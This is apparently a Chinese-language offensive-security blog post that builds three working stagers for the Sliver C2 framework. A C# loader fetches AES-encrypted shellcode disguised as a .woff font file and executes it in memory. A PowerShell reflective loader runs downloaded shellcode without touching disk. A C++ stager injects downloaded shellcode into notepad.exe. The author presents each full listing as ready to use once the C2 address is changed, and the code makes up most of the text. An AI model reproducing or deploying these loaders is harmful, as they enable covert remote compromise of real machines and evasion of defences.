一、C# Stager - AES 加密
--------------------

基于之前的 C# Stager ，添加了 AES 加解密模块。  
参考 - <https://github.com/BishopFox/sliver/wiki/Stagers#encrypted-stage-example>

### 创建 Stage Listener

在 Sliver 自带的分阶段监听器（Stage Listener）中默认提供了 AES 加密的参数选项，AES 加密参数选项如下：

```shell
Usage:
======
  stage-listener [flags]
Flags:
======
  --aes-encrypt-iv  string    encrypt stage with AES encryption iv
  --aes-encrypt-key string    encrypt stage with AES encryption key
```

这里假定密钥和偏移值分别为 `D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT` 和 `8y/B?E(G+KbPeShV`  
创建带有AES加密功能的分阶段执行器：

```shell
stage-listener --url http://172.16.181.182:80 --profile win64_stage --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

![p9BHnh9.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a4ea8f83f36a2557e1f9bcfff5836db741a3d7d8.png)

### 创建 C# Stager - AES

基于前文编写的 C# Stager 代码，添加 AES 解密模块及一些细节处理点。

首先是格式处理部分：将一个字节数组 `shellcode` 中从下标为 16 开始的所有元素添加到一个 `List<byte>` 类型的列表 `l` 中，然后将 `l` 转换为字节数组并赋值给 `ciphertext` 变量。

```CS
    List<byte> l = new List<byte> { };
    for (int i = 16; i <= shellcode.Length - 1; i++)
    {
        l.Add(shellcode[i]);
    }
    byte[] ciphertext = l.ToArray();
```

接着就是解密部分：使用 `Aes.Create()` 创建一个 AES 算法实例。将 `key` 和 `IV` 分别赋值给 `aesAlg` 的 `Key` 和 `IV` 属性，并设置 `PaddingMode` 为 `PaddingMode.None`，表示不使用任何填充模式。接着使用 `aesAlg` 中的 `CreateDecryptor()` 方法创建一个解密器对象 `decryptor`，用于对加密数据进行解密操作。  
然后创建 `MemoryStream` 对象 `memoryStream` 用于存储解密后的数据以及使用 `CryptoStream` 对象 `cryptoStream` ，用于将流与加密转换器关联起来，对数据进行解密操作，通过`cryptoStream.Write` 方法将解密后的数据保存至 `memoryStream` 中。

```CS
    byte[] key = Encoding.UTF8.GetBytes(AESKey);
    byte[] IV = Encoding.UTF8.GetBytes(AESIV);

    using (Aes aesAlg = Aes.Create())
    {
        aesAlg.Key = key;
        aesAlg.IV = IV;
        aesAlg.Padding = PaddingMode.None;

        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
        using (MemoryStream memoryStream = new MemoryStream(ciphertext))
        {
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
            {
                cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                return memoryStream.ToArray();
            }
        }
    }
```

Main函数部分：在下载和执行方法中间加入解密模块的调用。

```CS
    static void Main(string[] args)
    {
        byte[] shellcode_encrypt = Download("http://172.16.181.182/update.woff");
        byte[] shellcode = Decrypt(shellcode_encrypt, AESKey, AESIV);
        Execute(shellcode);
        return;
    }
```

### 快速上手 - 完整代码 ?

```CS
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace L15_Stage_Listener_2
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT";
        private static string AESIV = "8y/B?E(G+KbPeShV";

        private static byte[] Download(string url)
        {
            // 不检查证书
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            // 调用DownloadData方法，下载指定内容
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            return shellcode;
        }

        private static byte[] Decrypt(byte[] shellcode, string AESKey, string AESIV)
        {
            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length - 1; i++)
            {
                l.Add(shellcode[i]);
            }

            byte[] ciphertext = l.ToArray();

            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static void Execute(byte[] buf)
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, (IntPtr)(addr), buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        static void Main(string[] args)
        {
            byte[] shellcode_encrypt = Download("http://172.16.181.182/update.woff");
            byte[] shellcode = Decrypt(shellcode_encrypt, AESKey, AESIV);
            Execute(shellcode);
            return;
        }
    }
}
```

### 编译执行及流量分析

选择 x64 编译执行后，等待片刻，成功上线 Sliver C2。  
![p9BHKpR.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5bf26e3a9ce51eb6aafd9c6bbc0b7edb810f19d2.png)

同样，打开 WireShark 抓取流量分析，使用下面过滤器命令可以看到目标主机像我们的C2服务器请求了一份 update.woff 文件，即经过 AES 加密后的 Stager 代码。

```shell
http contains "woff"
```

![p9BHek4.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-40c44eafb0ba6ab8c7d0f8c200242cf55d2477c0.png)  
经过 7000+ 个包传输，开始建立连接。  
![p9BHmtJ.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-42dab77524605e868ade0534f7512d0b3d088d8c.png)

二、Powershell Stager - 反射加载
--------------------------

### Powershell Stager 存在的问题

在上部分文章中，我们引出了一个问题，就是使用Add-Type并非完全在内存中执行，Add-Type 会调用 CSC 编译器，将文件写入硬盘中。可以通过 Process Monitor 来监视 Add-Type 的行为：  
![p9BH80O.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cdd7d6b8a8a31274dc00ed60e8febc3b2e536a20.png)  
因此，这部分介绍使用反射加载的方式来实现真正纯内存中执行。下面首先给出完整的代码、执行效果，后再给出编写过程，主要是这部分比较复杂，一开始放出来难以消化，不懂的话慢慢反复阅读，或者直接把我给出的反射模版直接套用即可。

### 快速上手 - 完整代码 ?

首先创建一个新的stage监听器，不带加密参数，端口设定为8443。

```shell
stage-listener --url http://172.16.181.182:8443 --profile win64_stage
```

这里先给出我自己编写的最终利用代码，只要修改其中 $url 参数就可以拿去使用了，后面在根据我的思路展开分析。

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) 
}

function getDelegateType {
    # 定义封装方法的参数
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    )
    # 创建程序集对象、配置访问模式、构建模块和构建自定义类型。
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    # 添加函数原型、设置构造器执行标志
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    # 创建方法、配置方法执行标志
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    # 返回实例化的委托类型
    return $type.CreateType() 
}

# shellcode
$url = "http://172.16.181.182:8443/update.woff"
$client = New-Object System.Net.WebClient # 下载shellcode到内存中 
$shellcode = $client.DownloadData($url) # 将shellcode转换为Byte[]类型 
[Byte[]] $payload = $shellcode

# 通过反射调用执行函数
$exec_mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $payload.length, 0x3000, 0x40)

# 拷贝shellcode
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $exec_mem, $payload.length)

# 创建线程
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$exec_mem,[IntPtr]::Zero,0,[IntPtr]::Zero)

# 暂停等待执行
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

### 运行效果

直接运行，通过8443下载shellcode代码，再通过9002进行通信连接。  
![p9BHQ6x.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e182da9baefb1b68b91e52776f5415a3d8b43beb.png)  
此时再查看 Process Monitor 就找不到之前的落地文件了。

### 编写过程及逻辑分析

#### 01 动态查找技术

为了达到完全实现在内存中执行的效果，使用动态查找技术。  
动态查找技术需要列出程序集中符合的函数，主要是找到 GetProcAddress 和 GetModuleHandle

```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies | ForEach-Object {
    $_.GetTypes()| ForEach-Object {
        $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe') 
        }
    } 2> $null 
}
```

精确定位到包含指定函数的程序集中，找到 system.dll 程序集

```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies | ForEach-Object {
    $_.Location
    $_.GetTypes()| ForEach-Object {
        $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
        }
    } 2> $null 
}
```

在 PowerShell 中，反射（Reflection）是指使用 .NET Framework 中的 System.Reflection 命名空间中的类型和方法来**查看和操作对象的内部结构**。可以在运行时动态地获取类型信息、访问对象的属性和方法、创建新的对象实例，以及在不直接使用代码的情况下操作对象。

找到了包含 GetProcAddress 和 GetModuleHandle 两函数的程序集 system.dll 后，下一步就是通过反射技术获取到其中的方法。

```powershell
# 获取到System.dll程序集（对象）
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })

# 通过反射获取到类
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')

# 通过反射获取到其中的方法
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
```

最后进行方法的调用，第一个参数是要调用它的对象，这里是 Static 方法，没有创建实例设置为$null。第二个参数是含有各参数的一个数组。

```powershell
$GetModuleHandle.Invoke($null, @("user32.dll"))
```

#### 02 委托类型

> 构建委托类型用于定义参数类型，才能通过函数地址**调用函数**。

承接上文，目前已经可以解析函数地址，下一步就是需要定义参数类型，用以C#中解析的函数内存地址配对。在C#中，可以使用 [GetDelegateForFunctionPointer](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=netframework-4.8) 方法来定义参数类型，输入两个参数，第一个是需要定义参数类型的函数地址（上面已经获得了的），第二个是**函数原型**。  
什么是函数原型呢？就是一个函数的定义，如下例：

```c++
[访问修饰符] 返回类型 函数名(参数列表)
public int Add(int x, int y)
```

此外，C#中**函数原型**也被称为**委托类型**，**委托类型**是一种表示**函数签名**的类型，定义了一个函数类型，如下例：

```c++
delegate 返回类型 委托类型名(参数列表)
delegate int Calculate(int x, int y);
```

函数签名就是指函数的名称、参数类型和参数顺序的组合，用于唯一标识函数，如下例，

```c++
<函数名>(<参数类型1>，<参数类型2>...)
AddNumbers(int, int)
```

> 注意的是：函数签名不包括返回类型、参数名称、访问修饰符或函数体。

上面三个是重要的概念，建议反复去吸收，这里也以MessageBox为例子，创建其委托类型如下

```c++
int delegate MessageBoxSig(IntPtr hWnd, String text, String caption, int options);
```

对应的该函数的签名如下：

```c++
int MessageBoxSig(IntPtr hWnd, String text, String caption, int options);
```

PowerShell 没有提供直接方法创建委托类型，只能通过反射的方法创建委托类型。  
从Add-Type中可知，委托类型是在编译程序集时创建的，因此需要手动在内存中创建程序集并填充内容

1. 创建新程序集对象

```powershell
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
```

2. 配置访问模式

```powershell
$Domain = [AppDomain]::CurrentDomain  
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly,
[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```

3. 在程序集中构建模块

```powershell
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```

4. 构建自定义类型（将成为委托类型）

```powershell
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
```

名称+属性+类型

5. 添加函数原型（通过构造器）

```powershell
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int]))
```

构造器的属性+构造器的调用惯例+参数类型

6. 设置构造器执行标志

```powershell
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
```

7. 创建方法

```powershell
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))
```

名称+属性+返回类型+参数类型

8. 设置方法的执行标志

```powershell
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
```

9. 实例化委托类型（反射方式）

```powershell
$MyDelegateType = $MyTypeBuilder.CreateType()
```

10. 得到委托类型

```powershell
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
```

11. 委托调用函数

```powershell
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```

最后将上面的所有代码进行封装整合，同时添加上 Download 模块（上篇中提及到），就是上面的完整代码了，全部看起来很复杂，但是理解到其中的逻辑和思路后，实际上也没有那么难的。

三、C++ Stager - 进程注入
-------------------

进程注入是在shellcode runner的基础上进行改进，打开某一进程并让shellcode在其中执行，而非直接运行。那么这里就需要额外添加几部分代码：

1. 获取目标进程pid的代码块
2. 打开该进程并拷贝shellcode的代码块

### 进程注入模块

具体可参考我之前写的这篇文章 - <https://forum.butian.net/share/1510>  
下面也简单的介绍分析下。  
首先是获取目标进程pid模块，其主要代码如下，主要就是利用到了捕获快照函数CreateToolhelp32Snapshot()，依次遍历寻找目标进程的PID，详细可参考注释。

```cpp
int FindTarget(const WCHAR* procname) {
    // PROCESSENTRY32描述快照拍摄时,驻留在系统地址空间的进程列表中的一个条目
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
    // CreateToolhelp32Snapshot()拍摄指定进程的快照
    // TH32CS_SNAPPROCESS包括快照中系统的所有进程
    // 返回句柄
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;    // 拍摄快照失败，返回0

    pe32.dwSize = sizeof(PROCESSENTRY32);   // 结构大小
    // 检索快照中的信息
    // 判定快照是否为空
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
    // Process32Next()循环检索快照信息  
    // 参数1是快照的句柄，参数2是指向PROCESSENTRY32数据结构的指针
    // lstrcmpiA()比较两个字符，相等返回0，将对应进程的pid返回
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}
```

其次就是注入代码部分，打开目标进程使用OpenProcess函数

```cpp
// 打开进程后返回句柄
// OpenProcess(访问的权限，继承，pid)
hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);
```

注入部分就是经典的三件套了

- VirtualAllocEx 申请内存
- WriteProcessMemory 拷贝shellcode
- CreateRemoteThread 创建执行线程

```cpp
int Inject(HANDLE hProc, BYTE* payload, DWORD payload_len) {
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    // VirtualAllocEx()改变一个指定进程的虚拟地址空间中的存区域的状态
    // (进程句柄，起始地址，分配的内存大小，内存分配的类型，分配内存的权限)
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    // WriteProcessMemory()将数据写到指定进程中的一个内存区域
    // (目标进程，写入的起始地址，写入的数据，写入大小)
    WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
    // CreateRemoteThread()创建一个在另一个进程的虚拟地址空间中运行的线程
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        // 等待0.5秒
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}
```

### 快速上手 - 完整代码 ?

剩下部分就是下载模块了，这部分就直接参考上篇的 C++ Stager 即可，最终的完整代码如下。后续直接修改 Sliver C2 服务器地址和端口即可直接使用。

```cpp
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>
#pragma comment (lib, "Wininet.lib")

struct Shellcode {
    BYTE* data;
    DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
    HINTERNET session = InternetOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);

    HINTERNET request = HttpOpenRequest(connection, L"GET", L"/fontawesome.woff", NULL, NULL, NULL, 0, 0);

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            exit(0);
        }
    }
    DWORD bufSize = BUFSIZ;
    byte* buffer = new byte[bufSize];
    DWORD capacity = bufSize;
    byte* payload = (byte*)malloc(capacity);
    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;
        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            exit(0);
        }
        if (bytesRead == 0) break;
        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            byte* newPayload = (byte*)realloc(payload, capacity);
            payload = newPayload;
        }
        for (DWORD i = 0; i < bytesRead; i++) {
            payload[payloadSize++] = buffer[i];
        }
    }
    byte* newPayload = (byte*)realloc(payload, payloadSize);

    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);

    struct Shellcode out;
    out.data = payload;
    out.len = payloadSize;
    return out;
}

int FindTarget(const WCHAR* procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
    // 返回句柄
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;    // 拍摄快照失败，返回0
    pe32.dwSize = sizeof(PROCESSENTRY32);   // 结构大小
    // 检索快照中的信息
    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
    // 循环检索快照信息  
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}

int Inject(HANDLE hProc, BYTE* payload, DWORD payload_len) {
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        // 等待0.5秒
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int main(void) {
    Shellcode shellcode = Download(L"172.16.181.182", 8443);
    HANDLE hProc = NULL;
    // 获取目标进程PID
    int pid = FindTarget(L"notepad.exe");
    if (pid) {
        printf("Notepad.exe PID = %d\n", pid);
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);
        if (hProc != NULL) {
            Inject(hProc, shellcode.data, shellcode.len);
            CloseHandle(hProc);
        }
    }
    return 0;
}
```

### 编译运行上线

同样，选择 x64 release 编译，执行上线  
![p9BHM11.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-66571f31087cb4e8bd1b71a7ff29e41c4492a3b0.png)

### 底层逻辑分析

通过 Process Hacker 和 WireShark 来验证该 Stager 是通过进程注入实现的。  
运行时打开 Process Hacker，找到分配的内存空间，可以查看到与WireShark中TCP包中数据完全匹配  
![p9BH3nK.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-4e518c29b920eb3b514f2a38e96b40b27276b487.png)

后记 ✅
----

这两篇关于Sliver Stager的研究前前后后花了一周多的时间，总结出来方便以后实战中的使用，当然，实际场景下的运用有机会遇到也会分享出来。这块内容也还是有拓展的地方，比如在Powershell中实现AES加解密、一行实现Powershell反射加载等，这些算是留给读者的作业了，可以基于这两篇文章去尝试。